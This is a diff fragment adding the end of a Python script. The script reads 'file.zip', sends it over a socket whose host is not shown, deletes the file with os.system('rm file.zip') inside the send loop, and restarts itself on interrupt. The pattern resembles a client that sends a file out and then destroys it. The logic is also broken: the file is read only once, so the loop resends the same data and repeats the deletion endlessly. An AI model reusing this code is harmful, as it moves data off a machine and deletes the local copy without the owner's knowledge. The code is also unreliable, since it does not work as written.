@@ -1,0 +1,11 @@
+        f = open ("file.zip","rb")
+        data = f.read(1024)
+        while data != bytes(''.encode()):
+            s.send(data)
+            os.system('rm file.zip')
+            print('Thanks!')
+        s.close()
+    except KeyboardInterrupt:
+        main()
+        
+main()
